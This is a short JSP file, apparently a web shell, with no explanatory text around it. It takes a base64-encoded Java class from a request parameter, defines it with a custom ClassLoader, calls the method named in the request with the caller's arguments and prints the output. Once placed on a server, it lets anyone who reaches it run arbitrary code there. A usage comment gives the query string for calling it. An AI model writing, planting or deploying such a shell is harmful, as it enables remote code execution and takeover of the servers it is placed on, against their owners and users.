<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%-- classloader.jsp?class=&method=&args= --%>
<%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%><%

    String funMethod = request.getParameter("method");
    String classContent = request.getParameter("class");
    String args = request.getParameter("args");

    byte[] classByte = new sun.misc.BASE64Decoder().decodeBuffer(classContent);

    Class newClass = new U(this.getClass().getClassLoader()).g(classByte);
    try {
        String result = (String) newClass.getMethod(funMethod, String.class).invoke(null, args);
        out.print(result);
    } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
        e.printStackTrace();
    }

%>
